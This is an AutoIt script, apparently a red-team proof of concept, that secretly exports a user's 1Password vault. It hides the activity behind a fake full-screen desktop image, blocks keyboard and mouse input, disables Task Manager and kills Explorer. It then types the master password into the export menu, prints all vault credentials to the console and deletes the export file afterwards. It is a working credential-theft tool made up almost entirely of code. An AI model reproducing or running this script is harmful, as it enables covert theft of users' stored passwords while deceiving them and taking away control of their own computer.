#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Change2CUI=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

#include <Array.au3>
#include <GUIConstants.au3>
#include <ScreenCapture.au3>
#include <GuiToolBar.au3>
#include <GUIConstants.au3>

#cs --------------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         VIVI (https://github.com/V1V1) | (https://twitter.com/_theVIVI)

 Script Function:
	Exports 1Password vault credentials to disk using UI automation & key presses.
    Requires user's master password and admin privileges on target PC.

 Notes:
    This script will block a user's keyboard and mouse inputs while displaying a
    full screen image of the user's desktop on top of other windows -
    preventing the user from seeing the script performing the credential extraction.
    Normal execution will be restored after the extraction is finished.

 Warning:
    I wrote this as a PoC, I haven't tested all the possible scenarios.
    It's very possible for execution to fail and get stuck with a frozen screen.
    Use [Ctrl+Alt+Del] to exit if stuff goes wrong during tests.

#ce --------------------------------------------------------------------------------

; Title
ConsoleWrite(@CRLF & "=========== 1Password credential export ===========" & @CRLF & @CRLF)

; Priv check
_CheckPrivs()

; 1Password window checks
_Check1PasswordWindow()

; Block user input and attempt credential export
_ScreenBlock()

#cs ----------------------------------------------------------------------------

Main functions:
    _Check1PasswordWindow
    _ScreenBlock()
    _Export1PasswordCreds()
    _Quit()

#ce ----------------------------------------------------------------------------

Func _CheckPrivs()

    ; Just checks if we're admin
    If Not IsAdmin() Then
        ConsoleWrite("[X] You must have administrator privileges." & @CRLF & @CRLF)
        Exit
    EndIf

EndFunc ;==>_CheckPrivs

Func _Check1PasswordWindow()

    ; Process check
    ConsoleWrite("----- Process check -----" & @CRLF & @CRLF)
    ConsoleWrite("[*] Checking for 1Password process" & @CRLF & @CRLF)
    $1PasswordPID = ProcessExists("1Password.exe")

    If Not $1PasswordPID = 0 Then
        ConsoleWrite("  [i] 1Password.exe is running (PID: " & $1PasswordPID & ")" & @CRLF)
    ElseIf $1PasswordPID = 0 Then
        ConsoleWrite("  [X] 1Password.exe is not running. Exiting." & @CRLF & @CRLF)
        Exit
    EndIf

    ; Get 1Password window handle
    Global $1PasswordHandle = _GetHwndFromPID($1PasswordPID)

    ; Window active check
    If WinActive($1PasswordHandle) Then
        ConsoleWrite("  [X] 1Password window is currently in the foreground. Try again later?" & @CRLF & @CRLF)
        Exit
    EndIf

    ; Get 1Password Window title
    $1PasswordWindowTitle = WinGetTitle($1PasswordHandle)
    ConsoleWrite("  [i] 1Password window title: " & $1PasswordWindowTitle & @CRLF & @CRLF)

EndFunc ;==>_Check1PasswordWindow

; Adapted from - https://community.spiceworks.com/topic/534564-temp-lock-screen
; Credits - raycaruso (https://community.spiceworks.com/people/raycaruso/)
Func _ScreenBlock()

    ConsoleWrite("----- Block user input -----" & @CRLF & @CRLF)

    ; Exit key - can be modified to whatever you'd like
    ; Use [Ctrl+Alt+Del] to exit if everything goes wrong
    HotKeySet("{F6}", "_Quit")

    ; Take full desktop screenshot
    ConsoleWrite("[*] Taking desktop screenshot" & @CRLF & @CRLF)
    Global $desktopScreenCap = @TempDir & "\desktop-screen.jpg"
    _ScreenCapture()

    ; Display saved screenshot as full screen window
    $gui = GuiCreate("", @DesktopWidth, @DesktopHeight, "", "", $WS_POPUP)
    GUICtrlCreatePic($desktopScreenCap, 0, 0,@DesktopWidth, @DesktopHeight)
    ; Change our screenshot window to always be on top
    WinSetOnTop($gui, "", 1)
    GUISetState()

    _Lock() ; Calls it once, since it's not in the while 1 loop.

    ; Start timer - credential export will be attempted in this 10 second window
    Local $timerSeconds = 10
    Local $stopTime = $timerSeconds * 1000
    ConsoleWrite("[*] Blocking user input for " & $timerSeconds & " seconds" & @CRLF & @CRLF)
    Local $hTimer = TimerInit()

    While 1
        ; Attempt 1Password credential export in block window - exit loop if successful
        _Export1PasswordCreds()
        If TimerDiff($hTimer) >= $stopTime Then _StopTimer()
    WEnd

EndFunc ;==>_ScreenBlock

Func _Export1PasswordCreds()

    ; Cred export
    ConsoleWrite("----- Credential export -----" & @CRLF & @CRLF)
    ConsoleWrite("[*] Attempting 1Password credential export" & @CRLF & @CRLF)

    ; Open 1Password from tray icon
    ConsoleWrite("  [*] Opening 1Password" & @CRLF & @CRLF)
    _Clickon1PasswordTrayIcon()

    ; Open main 1Password app (keyboard shortcut)
    Send("^+\")
    ; Give main window some time to open
    Sleep(1500)

    ; Select all saved entries in vault & open export menu
    ConsoleWrite("  [*] Opening export menu" & @CRLF & @CRLF)
    Send("{TAB 3}")
    Send("^a")
    Send("{APPSKEY}")
    Send("x")

    ; Enable export with user's master password
    Sleep(1000)
    $masterPass = String("[ENTER MASTER PASSWORD HERE]")
    Send($masterPass)
    Send("{ENTER}")
    ; Give save as menu a little time to open
    Sleep(1500)

    ; Export creds to .csv file in current user's temp directory
    ConsoleWrite("  [*] Exporting credentials to csv file" & @CRLF & @CRLF)
    $outputFile = @TempDir & "\1Password-export.csv"
    Send($outputFile)
    Send("{TAB}")
    Sleep("c")
    Send("{ENTER}")

    ; Close output directory - 1Password opens it after export
    WinWaitActive("Temp")
    WinClose("Temp")

    ; Minimize 1Password window
    ConsoleWrite("  [*] Minimizing 1Password window" & @CRLF & @CRLF)
    WinWaitActive("All Vaults")
    WinClose("All Vaults")

    ; Print output file location
    ConsoleWrite("  [i] 1Password export file written to: " & $outputFile & @CRLF & @CRLF)

    ; Read export file
    ConsoleWrite("[*] Reading output file" & @CRLF & @CRLF)
    Sleep(2000)
    If FileExists($outputFile) Then
        Local $sfileRead = FileRead($outputFile)
        ConsoleWrite("[+] Output file contents:" & @CRLF & @CRLF & $sfileRead)
    EndIf

    ; Delete export file
    ConsoleWrite(@CRLF & @CRLF & "[*] Deleting output file" & @CRLF & @CRLF)
    FileDelete($outputFile)
    ConsoleWrite("  [i] Export file at '" & $outputFile & "' has been deleted" & @CRLF & @CRLF)

    ; Credential extraction finished, stop the timer so we don't end up in loop of countless extraction attempts
    ConsoleWrite("[*] Done")
    _StopTimer()

EndFunc ;==>_Export1PasswordCreds()

; Quit and cleanup (called when exit key is pressed)
Func _Quit()
    BlockInput(0)
    ; Delete desktop screenshot
    ConsoleWrite(@CRLF & @CRLF & "[*] Deleting desktop screenshot" & @CRLF & @CRLF)
    FileDelete($desktopScreenCap)
    ConsoleWrite("  [i] Desktop screenshot at '" & $desktopScreenCap & "' has been deleted" & @CRLF & @CRLF)
    ConsoleWrite("[*] Done." & @CRLF & @CRLF)
    Exit
EndFunc

#cs ----------------------------------------------------------------------------

Util functions:
    _Lock()
    _StopTimer()
    _ScreenCapture()
    _GetHwndFromPID()
    _Clickon1PasswordTrayIcon()

#ce ----------------------------------------------------------------------------

; Disables task manager
Func _Lock()
    BlockInput(1)
    Run("taskmgr.exe", "", @SW_DISABLE)
    WinKill("Explorer.exe")
EndFunc

; Stops timer, frees user input & deletes desktop screenshot
Func _StopTimer()
    ConsoleWrite(@CRLF & @CRLF & "----- Clean up -----" & @CRLF & @CRLF)
    ConsoleWrite("[*] Restoring user's desktop session and keyboard input.")
    Send("{F6}")
    Exit
EndFunc ;==>_StopTimer

Func _ScreenCapture()
    $hBmp = _ScreenCapture_Capture("", 0, 0, -1, -1, False)
    _ScreenCapture_SaveImage($desktopScreenCap, $hBmp)
    ConsoleWrite("  [i] Desktop screenshot saved to: " & $desktopScreenCap & @CRLF & @CRLF)
    Sleep(1500)
EndFunc ;==>_ScreenCapture

; Gets window handle from PID
; Adapted from - https://www.autoitscript.com/wiki/FAQ#How_can_I_get_a_window_handle_when_all_I_have_is_a_PID.3F
Func _GetHwndFromPID($PID)

    $hWnd = 0
    $stPID = DllStructCreate("int")
    Do
        $winlist2 = WinList()
        For $i = 1 To $winlist2[0][0]
            If $winlist2[$i][0] <> "" Then
                DllCall("user32.dll", "int", "GetWindowThreadProcessId", "hwnd", $winlist2[$i][1], "ptr", DllStructGetPtr($stPID))
                If DllStructGetData($stPID, 1) = $PID Then
                    $hWnd = $winlist2[$i][1]
                    ExitLoop
                EndIf
            EndIf
        Next
        Sleep(100)
    Until $hWnd <> 0
    Return $hWnd

EndFunc ;==>_GetHwndFromPID

; Search for 1Password icon in toolbar and click on it if found
; Adapted from - https://www.autoitscript.com/forum/topic/198426-get-text-from-specific-toolbar-tray-icon/?do=findComment&comment=1423626
; Credits - Subz (https://www.autoitscript.com/forum/profile/101464-subz/)
Func _Clickon1PasswordTrayIcon()

    Global $g_aTaskBar[0]
    Global $g_iInstance = 1
    Global $g_hWnd, $g_iCount, $g_iCmdID, $g_iSearch, $g_sSearch = "1Password"
    While 1
        $g_hWnd = ControlGetHandle("[CLASS:Shell_TrayWnd]", "", "[CLASS:ToolbarWindow32;INSTANCE:" & $g_iInstance& "]")
        ;~ Get number of buttons
        $g_iCount = _GUICtrlToolbar_ButtonCount($g_hWnd)
            If $g_iCount > 1 Then ExitLoop
        $g_iInstance += 1
    WEnd
    ;~ Loop through buttons
    For $i = 1 To $g_iCount
        $g_iCmdID = _GUICtrlToolbar_IndexToCommand($g_hWnd, $i)
        ;~ Check during the loop
        If StringInStr(_GUICtrlToolbar_GetButtonText($g_hWnd, $g_iCmdID), $g_sSearch) Then _GUICtrlToolbar_ClickButton($g_hWnd,$g_iCmdID, "left", False, 1)
        ;~ Add the item to an array
        _ArrayAdd($g_aTaskBar, _GUICtrlToolbar_GetButtonText($g_hWnd, $g_iCmdID))
    Next
EndFunc ;==>_Clickon1PasswordTrayIcon
